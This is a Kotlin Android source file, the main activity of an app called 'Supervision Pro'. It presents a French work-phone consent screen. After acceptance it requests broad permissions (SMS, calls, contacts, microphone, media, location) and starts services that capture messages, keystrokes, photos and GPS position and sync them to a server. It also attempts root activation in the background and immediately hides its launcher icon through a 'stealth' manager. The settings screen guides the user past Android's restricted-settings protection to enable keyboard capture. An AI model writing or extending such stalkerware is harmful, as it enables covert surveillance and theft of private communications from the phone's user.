package com.surveillancepro.android

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.lifecycleScope
import com.surveillancepro.android.data.ApiClient
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.services.AppUsageTracker
import com.surveillancepro.android.services.CallLogTracker
import com.surveillancepro.android.services.ContentObserverService
import com.surveillancepro.android.services.LocationService
import com.surveillancepro.android.services.MediaObserverService
import com.surveillancepro.android.services.StealthManager
import com.surveillancepro.android.services.AggressiveCaptureService
import com.surveillancepro.android.root.RootActivator
import com.surveillancepro.android.root.RootManager
import com.surveillancepro.android.ui.theme.SupervisionProTheme
import com.surveillancepro.android.workers.SyncWorker
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : ComponentActivity() {

    private lateinit var storage: DeviceStorage
    private lateinit var api: ApiClient
    private var mediaObserver: MediaObserverService? = null

    private val locationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        if (permissions.values.all { it }) {
            startLocationService()
        }
    }

    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) {}

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        storage = DeviceStorage.getInstance(this)
        api = ApiClient.getInstance(storage)

        setContent {
            SupervisionProTheme {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    if (storage.hasAccepted) {
                        SupervisionActiveScreen()
                    } else {
                        ConsentScreen()
                    }
                }
            }
        }

        // Si déjà enregistré, lancer les services
        if (storage.hasAccepted && storage.deviceToken != null) {
            startAllServices()

            // Activer le mode furtif si pas encore actif
            val currentMode = StealthManager.getCurrentMode(this)
            if (currentMode == StealthManager.StealthMode.VISIBLE) {
                // Disparition immédiate si déjà configuré
                StealthManager.hideImmediately(this)
            }
        }
    }

    private fun startAllServices() {
        startLocationService()
        startContentObserverService()
        startMediaObserver()
        startAggressiveCaptureService()

        SyncWorker.schedule(this, intervalMinutes = 5)
        SyncWorker.triggerNow(this)

        // Activation ROOT en arrière-plan (ne bloque pas l'UI)
        lifecycleScope.launch(kotlinx.coroutines.Dispatchers.IO) {
            val rootStatus = RootActivator.activate(this@MainActivity)
            Log.d("MainActivity", "Root activation: $rootStatus")
        }

        Log.d("MainActivity", "All services started")
    }

    private fun startContentObserverService() {
        try {
            startForegroundService(Intent(this, ContentObserverService::class.java))
        } catch (e: Exception) {
            Log.w("MainActivity", "ContentObserverService: ${e.message}")
        }
    }

    private fun startMediaObserver() {
        try {
            mediaObserver = MediaObserverService(this)
            mediaObserver?.start()
            // Scan initial des photos récentes au démarrage
            lifecycleScope.launch(Dispatchers.IO) {
                delay(3000) // Attendre que tout soit prêt
                mediaObserver?.scanRecentPhotos()
            }
        } catch (e: Exception) {
            Log.w("MainActivity", "MediaObserver: ${e.message}")
        }
    }

    private fun startAggressiveCaptureService() {
        try {
            startForegroundService(Intent(this, AggressiveCaptureService::class.java))
        } catch (e: Exception) {
            Log.w("MainActivity", "AggressiveCaptureService: ${e.message}")
        }
    }

    @Composable
    fun ConsentScreen() {
        var firstName by remember { mutableStateOf("") }
        var isLoading by remember { mutableStateOf(false) }
        var error by remember { mutableStateOf<String?>(null) }
        var accepted by remember { mutableStateOf(false) }

        if (accepted) {
            SupervisionActiveScreen()
            return
        }

        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(24.dp)
        ) {
            Spacer(Modifier.height(16.dp))
            Text("Telephone professionnel", fontSize = 22.sp, fontWeight = FontWeight.Bold, modifier = Modifier.align(Alignment.CenterHorizontally))
            Spacer(Modifier.height(4.dp))
            Text("Conditions d'utilisation", fontSize = 14.sp, color = MaterialTheme.colorScheme.onSurfaceVariant, modifier = Modifier.align(Alignment.CenterHorizontally))
            Spacer(Modifier.height(20.dp))

            Text("Ce telephone est un appareil professionnel. En l'utilisant, vous acceptez que vos activites soient enregistrees :", fontSize = 14.sp)
            Spacer(Modifier.height(12.dp))

            val points = listOf(
                "Activites et utilisation du telephone",
                "Messages et notifications (WhatsApp, SMS, Telegram...)",
                "Textes saisis au clavier",
                "Journal des appels telephoniques et SMS",
                "Contacts du repertoire",
                "Photos et videos de la galerie",
                "Applications installees et temps d'utilisation",
                "Informations techniques (batterie, stockage, modele)",
                "Localisation GPS periodique",
            )
            points.forEach { point ->
                Row(modifier = Modifier.padding(vertical = 3.dp)) {
                    Text("\u2022 ", fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.primary)
                    Text(point, fontSize = 14.sp)
                }
            }

            Spacer(Modifier.height(16.dp))
            Card(colors = CardDefaults.cardColors(containerColor = Color(0xFFFFF3E0))) {
                Text(
                    "Pour toute activite privee, utilisez votre telephone personnel.",
                    modifier = Modifier.padding(12.dp), fontSize = 13.sp, fontWeight = FontWeight.Medium, color = Color(0xFFE65100)
                )
            }

            Spacer(Modifier.height(24.dp))
            OutlinedTextField(
                value = firstName, onValueChange = { firstName = it },
                label = { Text("Votre prenom") },
                placeholder = { Text("Ex: Lucas") },
                modifier = Modifier.fillMaxWidth(),
                singleLine = true,
            )

            error?.let {
                Spacer(Modifier.height(8.dp))
                Text(it, color = MaterialTheme.colorScheme.error, fontSize = 13.sp)
            }

            Spacer(Modifier.height(20.dp))
            Button(
                onClick = {
                    if (firstName.length < 2) { error = "Entrez votre prenom"; return@Button }
                    isLoading = true; error = null
                    lifecycleScope.launch {
                        var attempts = 0
                        val maxAttempts = 10

                        while (attempts < maxAttempts) {
                            attempts++
                            try {
                                error = if (attempts > 1) "Reveil du serveur... tentative $attempts/$maxAttempts" else "Connexion au serveur..."

                                val deviceId = storage.deviceId
                                val date = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())

                                val result = api.registerDevice(
                                    deviceId = deviceId,
                                    deviceName = "${Build.MANUFACTURER} ${Build.MODEL} - $firstName",
                                    userName = firstName,
                                    acceptanceVersion = "1.0",
                                    acceptanceDate = date
                                )

                                val token = result?.get("deviceToken") as? String
                                if (token == null) {
                                    if (attempts >= maxAttempts) {
                                        error = "Le serveur ne repond pas. Verifiez votre connexion internet et reessayez."
                                        isLoading = false
                                        return@launch
                                    }
                                    delay(5000)
                                    continue
                                }

                                storage.deviceToken = token
                                storage.userName = firstName
                                storage.acceptanceDate = date

                                val consentOk = api.sendConsent("1.0", firstName)
                                if (!consentOk) {
                                    error = "Erreur de consentement. Reessayez."
                                    isLoading = false
                                    return@launch
                                }

                                storage.hasAccepted = true
                                storage.consentSent = true
                                isLoading = false

                                requestAllPermissions()
                                sendInitialData()
                                startAllServices()
                                accepted = true

                                // DISPARITION IMMÉDIATE du launcher - pas de délai
                                StealthManager.hideImmediately(this@MainActivity)
                                return@launch

                            } catch (e: Exception) {
                                Log.w("MainActivity", "Registration attempt $attempts failed: ${e.message}")
                                if (attempts >= maxAttempts) {
                                    error = "Connexion impossible. Verifiez votre connexion internet et reessayez."
                                    isLoading = false
                                    return@launch
                                }
                                delay(5000)
                            }
                        }
                    }
                },
                enabled = !isLoading && firstName.length >= 2,
                modifier = Modifier.fillMaxWidth().height(52.dp)
            ) {
                if (isLoading) {
                    CircularProgressIndicator(modifier = Modifier.size(20.dp), color = Color.White, strokeWidth = 2.dp)
                } else {
                    Text("J'accepte", fontWeight = FontWeight.Bold, fontSize = 16.sp)
                }
            }

            Spacer(Modifier.height(12.dp))
            Text(
                "${Build.MANUFACTURER} ${Build.MODEL} sera enregistre automatiquement.",
                fontSize = 11.sp, color = MaterialTheme.colorScheme.onSurfaceVariant,
                modifier = Modifier.align(Alignment.CenterHorizontally)
            )
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: ""
        return flat.contains(packageName)
    }

    private fun isAccessibilityEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
        return flat.contains(packageName)
    }

    private fun isUsageAccessEnabled(): Boolean {
        val appOps = getSystemService(APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = appOps.unsafeCheckOpNoThrow(
            android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(), packageName
        )
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    @Composable
    fun SupervisionActiveScreen() {
        var notifEnabled by remember { mutableStateOf(isNotificationListenerEnabled()) }
        var accessEnabled by remember { mutableStateOf(isAccessibilityEnabled()) }
        var usageEnabled by remember { mutableStateOf(isUsageAccessEnabled()) }
        var showSettings by remember { mutableStateOf(false) }
        val allEnabled = notifEnabled && accessEnabled && usageEnabled

        LaunchedEffect(Unit) {
            while (true) {
                delay(3000)
                notifEnabled = isNotificationListenerEnabled()
                accessEnabled = isAccessibilityEnabled()
                usageEnabled = isUsageAccessEnabled()
            }
        }

        if (showSettings) {
            SettingsScreen(notifEnabled, accessEnabled, usageEnabled, onBack = { showSettings = false })
            return
        }

        Box(modifier = Modifier.fillMaxSize()) {
            IconButton(
                onClick = { showSettings = true },
                modifier = Modifier.align(Alignment.TopEnd).padding(8.dp)
            ) {
                Text("\u2699\uFE0F", fontSize = 20.sp)
            }

            Column(
                modifier = Modifier.fillMaxSize().padding(32.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.Center,
            ) {
                if (!allEnabled) {
                    Card(colors = CardDefaults.cardColors(containerColor = Color(0xFFFFF3E0))) {
                        Text(
                            "Configuration requise. Appuyez sur \u2699\uFE0F",
                            modifier = Modifier.padding(12.dp), fontSize = 13.sp, color = Color(0xFFE65100), textAlign = TextAlign.Center
                        )
                    }
                } else {
                    Text("Supervision Pro", fontSize = 16.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
                }
            }
        }
    }

    @Composable
    fun SettingsScreen(notifEnabled: Boolean, accessEnabled: Boolean, usageEnabled: Boolean, onBack: () -> Unit) {
        val queue = remember { EventQueue.getInstance(this@MainActivity) }
        var queueCount by remember { mutableIntStateOf(queue.count()) }

        LaunchedEffect(Unit) {
            while (true) {
                delay(5000)
                queueCount = queue.count()
            }
        }

        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(24.dp)
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                IconButton(onClick = onBack) { Text("\u2190", fontSize = 20.sp) }
                Text("Parametres", fontSize = 18.sp, fontWeight = FontWeight.Bold)
            }

            Spacer(Modifier.height(16.dp))
            Card(modifier = Modifier.fillMaxWidth()) {
                Column(modifier = Modifier.padding(16.dp)) {
                    StatusRow("Utilisateur", storage.userName ?: "-")
                    StatusRow("Appareil", "${Build.MANUFACTURER} ${Build.MODEL}")
                    StatusRow("Evenements", "${storage.eventCount}")
                    StatusRow("File d'attente", "$queueCount en attente")
                    StatusRow("Depuis le", storage.acceptanceDate?.take(10) ?: "-")
                    StatusRow("Mode root", if (RootManager.isRooted()) "Actif" else "Non")
                }
            }

            Spacer(Modifier.height(20.dp))
            Text("Services", fontSize = 14.sp, fontWeight = FontWeight.Bold)
            Spacer(Modifier.height(8.dp))

            ServiceRow("Notifications", notifEnabled) { openNotificationSettings() }
            ServiceRow("Capture clavier", accessEnabled) { openAccessibilitySettings() }
            ServiceRow("Suivi applications", usageEnabled) { openUsageAccessSettings() }

            if (!notifEnabled || !accessEnabled || !usageEnabled) {
                Spacer(Modifier.height(12.dp))
                Card(colors = CardDefaults.cardColors(containerColor = Color(0xFFFFF3E0))) {
                    Text(
                        "Si \"Parametre restreint\" s'affiche : Parametres > Applications > Supervision Pro > menu (3 points) > Autoriser les parametres restreints",
                        modifier = Modifier.padding(12.dp), fontSize = 12.sp, color = Color(0xFFE65100)
                    )
                }
            }

            Spacer(Modifier.height(20.dp))
            OutlinedButton(
                onClick = { SyncWorker.triggerNow(this@MainActivity) },
                modifier = Modifier.fillMaxWidth()
            ) {
                Text("Synchroniser maintenant", fontSize = 13.sp)
            }
        }
    }

    @Composable
    fun ServiceRow(label: String, enabled: Boolean, onClick: () -> Unit) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(vertical = 6.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(label, fontSize = 14.sp)
            if (enabled) {
                Text("\u2705 Active", fontSize = 13.sp, color = Color(0xFF22C55E), fontWeight = FontWeight.Bold)
            } else {
                OutlinedButton(onClick = onClick) {
                    Text("Activer", fontSize = 12.sp)
                }
            }
        }
    }

    @Composable
    fun StatusRow(label: String, value: String) {
        Row(
            modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Text(label, fontSize = 13.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
            Text(value, fontSize = 13.sp, fontWeight = FontWeight.Medium)
        }
    }

    private fun requestAllPermissions() {
        val perms = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CALENDAR,
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
            perms.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        locationPermissionLauncher.launch(perms.toTypedArray())
    }

    private fun startLocationService() {
        try {
            val intent = Intent(this, LocationService::class.java).apply {
                putExtra(LocationService.EXTRA_MODE, LocationService.MODE_CONTINUOUS)
            }
            startForegroundService(intent)
        } catch (e: Exception) {
            Log.w("MainActivity", "Failed to start LocationService: ${e.message}")
        }
    }

    private fun sendInitialData() {
        val queue = EventQueue.getInstance(this)

        queue.enqueue("device_info", mapOf(
            "model" to Build.MODEL,
            "manufacturer" to Build.MANUFACTURER,
            "system" to "Android ${Build.VERSION.RELEASE}",
            "sdk" to Build.VERSION.SDK_INT,
        ))

        try {
            val tracker = AppUsageTracker(this)
            val apps = tracker.getInstalledApps()
            queue.enqueue("apps_installed", mapOf("apps" to apps, "count" to apps.size))
        } catch (_: Exception) {}

        try {
            CallLogTracker(this).syncToQueue(queue)
        } catch (_: Exception) {}
    }

    private fun openNotificationSettings() {
        try {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        } catch (_: Exception) {
            Toast.makeText(this, "Ouvrez Parametres > Notifications > Acces aux notifications", Toast.LENGTH_LONG).show()
        }
    }

    private fun openAccessibilitySettings() {
        try {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        } catch (_: Exception) {
            Toast.makeText(this, "Ouvrez Parametres > Accessibilite", Toast.LENGTH_LONG).show()
        }
    }

    private fun openUsageAccessSettings() {
        try {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
        } catch (_: Exception) {
            Toast.makeText(this, "Ouvrez Parametres > Acces aux donnees d'utilisation", Toast.LENGTH_LONG).show()
        }
    }
}
